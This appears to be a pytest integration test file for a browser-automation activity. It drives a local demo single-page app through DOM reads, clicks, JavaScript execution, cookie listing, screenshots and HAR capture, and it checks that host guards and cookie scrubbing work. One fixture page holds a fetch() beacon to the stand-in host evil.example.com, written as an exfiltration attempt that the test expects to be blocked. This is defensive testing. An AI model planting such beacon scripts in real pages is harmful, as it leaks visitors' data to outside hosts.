"""End-to-end browser_session activity against a local SPA-like target (W1).

Real-browser tests are gated twice so CI without a browser skips cleanly:

1. ``pytest.importorskip("playwright.sync_api")`` — skips when the optional
   ``quarry[browser]`` extra is not installed.
2. ``QUARRY_BROWSER_TESTS=1`` — opt-in because the test launches real Chromium.

The gate is applied *per test* (via ``_require_browser``), not at module level, so
the no-browser tests (e.g. a disallowed host refused before any launch) still run
in the default suite.

Manual invocation:

    QUARRY_BROWSER_TESTS=1 uv run pytest tests/integration/test_browser_session_e2e.py

Drives the real activity path: ``open_url`` → ``get_dom`` (client-rendered
routes) → ``click`` → ``execute_js`` → ``screenshot`` (scrubbed
``ArtifactRef(kind=screenshot)``) → ``stop_har`` (scrubbed
``ArtifactRef(kind=har)``), and asserts the request-level host guard refuses a
disallowed host before any process is launched.
"""

from __future__ import annotations

import http.server
import json
import os
import threading
from collections.abc import Iterator
from pathlib import Path
from typing import Any

import pytest

from quarry.schemas import ArtifactKind, RedactionStatus
from quarry_activities.browser_session import (
    BrowserSessionActivityInput,
    browser_session_impl,
)

#: Opt-in gate: real Chromium is launched, so real-browser tests only run when asked.
_BROWSER_TESTS_ENABLED = os.environ.get("QUARRY_BROWSER_TESTS") == "1"


def _require_browser() -> None:
    """Skip the calling test unless Playwright and the real-browser opt-in are present."""
    pytest.importorskip("playwright.sync_api")
    if not _BROWSER_TESTS_ENABLED:
        pytest.skip("set QUARRY_BROWSER_TESTS=1 to run real-browser tests")


#: A tiny "SPA": the home page renders a client-side router's routes into the DOM,
#: so get_dom proves the browser executed page JavaScript.
_SPA_HTML = """<!doctype html><html><body>
<h1 id="title">Demo SPA</h1>
<ul id="routes">
  <li class="route">/dashboard</li>
  <li class="route">/settings</li>
  <li class="route">/admin</li>
</ul>
<button id="go" onclick="document.getElementById('title').textContent='Clicked'">Go</button>
</body></html>"""

#: A page that tries to exfiltrate to a host outside allowed_hosts via fetch().
_BEACON_HTML = """<!doctype html><html><body><h1>Beacon</h1>
<script>
  fetch('http://evil.example.com/beacon').catch(() => {});
</script>
</body></html>"""


class _SpaHandler(http.server.BaseHTTPRequestHandler):
    def log_message(self, format: str, *args: Any) -> None:  # noqa: A002 - base API name
        return

    def do_GET(self) -> None:  # noqa: N802 - BaseHTTPRequestHandler API
        html = _BEACON_HTML if self.path == "/beacon" else _SPA_HTML
        data = html.encode("utf-8")
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(data)))
        self.send_header("Set-Cookie", "session=e2e-secret-cookie; Path=/")
        self.end_headers()
        self.wfile.write(data)


@pytest.fixture()
def spa_server() -> Iterator[tuple[str, int]]:
    server = http.server.ThreadingHTTPServer(("127.0.0.1", 0), _SpaHandler)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    try:
        yield str(server.server_address[0]), int(server.server_address[1])
    finally:
        server.shutdown()
        server.server_close()


def _open_input(
    host: str, port: int, tmp_path: Path, **overrides: Any
) -> BrowserSessionActivityInput:
    defaults: dict[str, Any] = {
        "action": "open_url",
        "url": f"http://{host}:{port}/",
        "allowed_hosts": (host,),
        "artifact_store_path": str(tmp_path / "artifacts"),
        "scan_id": "scan-e2e",
        "target_host": host,
        "target_port": port,
    }
    defaults.update(overrides)
    return BrowserSessionActivityInput(**defaults)


def test_full_spa_cycle_and_har(spa_server: tuple[str, int], tmp_path: Path) -> None:
    _require_browser()
    host, port = spa_server
    opened = browser_session_impl(_open_input(host, port, tmp_path, capture_har=True))
    assert opened["status"] == "ok"
    sid = opened["session_id"]

    dom = browser_session_impl(BrowserSessionActivityInput(action="get_dom", session_id=sid))
    assert "/dashboard" in dom["text"]

    clicked = browser_session_impl(
        BrowserSessionActivityInput(action="click", session_id=sid, selector="#go")
    )
    assert clicked["status"] == "ok"

    js = browser_session_impl(
        BrowserSessionActivityInput(
            action="execute_js", session_id=sid, script="document.querySelectorAll('.route').length"
        )
    )
    assert js["result"] == 3
    assert js["result_type"] == "number"

    cookies = browser_session_impl(
        BrowserSessionActivityInput(action="get_cookies", session_id=sid)
    )
    names = {c["name"] for c in cookies["cookies"]}
    assert "session" in names
    assert all("value" not in c for c in cookies["cookies"])

    shot = browser_session_impl(BrowserSessionActivityInput(action="screenshot", session_id=sid))
    assert shot["artifact"]["kind"] == ArtifactKind.SCREENSHOT.value

    har = browser_session_impl(BrowserSessionActivityInput(action="stop_har", session_id=sid))
    assert har["artifact"]["kind"] == ArtifactKind.HAR.value
    assert har["artifact"]["redaction_status"] in {
        RedactionStatus.REDACTED.value,
        RedactionStatus.NOT_REQUIRED.value,
    }
    stored = json.loads(Path(har["artifact"]["uri"].removeprefix("file://")).read_text())
    assert stored["log"]["version"] == "1.2"
    assert "e2e-secret-cookie" not in json.dumps(stored)


def test_disallowed_host_refused_before_launch(tmp_path: Path) -> None:
    result = browser_session_impl(
        BrowserSessionActivityInput(
            action="open_url",
            url="http://evil.example.com/",
            allowed_hosts=("localhost",),
            artifact_store_path=str(tmp_path),
            scan_id="scan-e2e",
        )
    )
    assert result["error"] == "host_denied"


def test_request_guard_blocks_exfil_beacon(spa_server: tuple[str, int], tmp_path: Path) -> None:
    """The request-level guard aborts a page's fetch() to a disallowed host."""
    _require_browser()
    host, port = spa_server
    opened = browser_session_impl(
        _open_input(host, port, tmp_path, url=f"http://{host}:{port}/beacon")
    )
    assert opened["status"] == "ok"
    assert opened["blocked_requests"] >= 1


def test_session_survives_cross_thread_actions(spa_server: tuple[str, int], tmp_path: Path) -> None:
    """A session opened on one thread is drivable from another (F3 regression).

    Temporal runs activities on an unpinned thread pool, so the session created in
    one invocation is driven from a different thread in the next. Playwright's sync
    API is thread-affine; the session-owned driver thread must absorb that.
    """
    _require_browser()
    host, port = spa_server
    opened = browser_session_impl(_open_input(host, port, tmp_path))
    assert opened["status"] == "ok"
    sid = opened["session_id"]

    results: dict[str, Any] = {}

    def _worker() -> None:
        results["dom"] = browser_session_impl(
            BrowserSessionActivityInput(action="get_dom", session_id=sid)
        )
        results["js"] = browser_session_impl(
            BrowserSessionActivityInput(
                action="execute_js",
                session_id=sid,
                script="document.querySelectorAll('.route').length",
            )
        )

    thread = threading.Thread(target=_worker)
    thread.start()
    thread.join()

    assert "/dashboard" in results["dom"]["text"]
    assert results["js"]["result"] == 3
